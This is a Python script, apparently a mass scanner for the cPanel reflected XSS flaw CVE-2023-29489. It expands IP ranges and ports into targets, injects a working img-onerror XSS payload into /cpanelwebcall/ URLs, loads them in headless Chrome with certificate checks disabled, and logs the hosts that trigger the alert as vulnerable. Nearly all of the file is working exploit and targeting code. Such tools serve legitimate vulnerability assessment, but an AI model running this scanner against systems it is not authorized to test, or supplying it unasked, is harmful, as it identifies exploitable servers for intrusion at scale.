import multiprocessing
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import argparse
import logging
import os
import re
import socket
import struct
import ipaddress
from datetime import datetime

now = datetime.now()
formatted_date_time = now.strftime("%d-%m-%Y-%H-%M-%S")

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

range_pattern = r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
cidr_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/(0|1\d|2[0-9]|3[0-2])'

# Arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="CVE-2023-29489 VA")
    parser.add_argument("--mip", help="A range of IP Address you wanted to check. E.g., 8.8.8.8/30,172.16.1.10-172.16.1.15", action="store_true")
    parser.add_argument("--ip-file", help="Path to the file containing a list of IPs to scan")
    parser.add_argument("--url-file", help="Path to the file containing a list of URLs to scan")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    # parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification")

    return parser.parse_args()

# Read port 
def read_port():
    port_path = os.path.join(os.getcwd(), "port.txt")

    with open(port_path, 'r') as port_file:
        ports = [item.strip() for item in re.split(r'[,\n]', port_file.read())]

    return ports 

# XSS Testing  
def check_url(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--ignore-certificate-errors") 
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(url)
        driver.implicitly_wait(5)
        alert = driver.switch_to.alert
        # Success
        if alert.text == "VULNERABLE":
            with open("vuln.txt", "a") as f:
                f.write(url + "\n")
                print(f"[VULN XSS!] >> {url}")
        else:
            print(f"[BAD XSS!] >> {url}")
    except Exception as e:
        print(f"[UKNOWN ERROR!] >> {url}")
    finally:
        driver.quit()

# Masscan IP Generation 
# Calculates IP addresses based on a range 
def calculate_ip_range(ip_range_string):
    start_ip, end_ip = map(str.strip, ip_range_string.split('-'))
    start = struct.unpack("!I", socket.inet_aton(start_ip))[0]
    end = struct.unpack("!I", socket.inet_aton(end_ip))[0]
    return (socket.inet_ntoa(struct.pack("!I", ip_int)) for ip_int in range(start, end + 1))

# Masscan IP Generation 
# Calculates the addresses based on the format
def generate_urls(ipaddresses, ports):
    data = []
    for s in ipaddresses:
        if re.match(range_pattern, s):
            range_ip = calculate_ip_range(s)
        elif re.match(cidr_pattern, s):
            network = ipaddress.IPv4Network(s, strict=False)
            range_ip = (str(ip) for ip in network)
        else:
            range_ip = [s]

        for ip in range_ip:
            for port in ports:
                url = f"{ip}:{port}"
                data.append(url)
    return data

# Masscan IP Generation 
def mas_scan_generation():
    ipaddr_path = os.path.join(os.getcwd(), "ipaddr.txt")
    port_path = os.path.join(os.getcwd(), "port.txt")

    with open(ipaddr_path, 'r') as ip_file, open(port_path, 'r') as port_file:
        ipaddresses = [item.strip() for item in re.split(r'[,\n]', ip_file.read())]
        ports = [item.strip() for item in re.split(r'[,\n]', port_file.read())]

    ipaddresses = generate_urls(ipaddresses, ports)
    output_path = os.path.join(os.getcwd(), f"generated_data/{formatted_date_time}-url.txt")

    with open(output_path, 'w') as file:
        file.writelines([f"{url}\n" for url in ipaddresses])

    return ipaddresses

if __name__ == "__main__":
    args = parse_arguments()
    massip = args.mip
    url_file = args.url_file
    ip_file = args.ip_file
    timeout = args.timeout
    # ssl_verify = args.disable_ssl_verify

    if not url_file and not massip and not ip_file:
        logger.error("--url_file, --mip or --ip-file is required!")
        exit(1)

    if ip_file:    
        with open(ip_file, "r") as f:
            ipaddr = [item.strip() for item in re.split(r'[,\n]', f.read())]

        ports = read_port()
        payload_url = []
        for ip in ipaddr:
            for port in ports:
                payload = f"https://{ip}:{port}/cpanelwebcall/<img%20src=x%20onerror='prompt(`VULNERABLE`)'>aaaaaaaaaaaa"
                payload_url.append(payload)

        pool = multiprocessing.Pool(processes=10)
        pool.map(check_url, payload_url)

    elif massip:
        ipaddr = mas_scan_generation()
        ports = read_port()
        payload_url = []
        for ip in ipaddr:
            payload = f"https://{ip}/cpanelwebcall/<img%20src=x%20onerror='prompt(`VULNERABLE`)'>aaaaaaaaaaaa"
            payload_url.append(payload)

        pool = multiprocessing.Pool(processes=10)
        pool.map(check_url, payload_url)

    elif url_file:
        with open(url_file, "r") as f:
            urls= f.read().splitlines()
        
        payload_url = []
        for url in urls:
            payload = f"https://{url}/<img%20src=x%20onerror='prompt(`VULNERABLE`)'>aaaaaaaaaaaa"
            payload_url.append(payload)

        pool = multiprocessing.Pool(processes=10)
        pool.map(check_url, payload_url)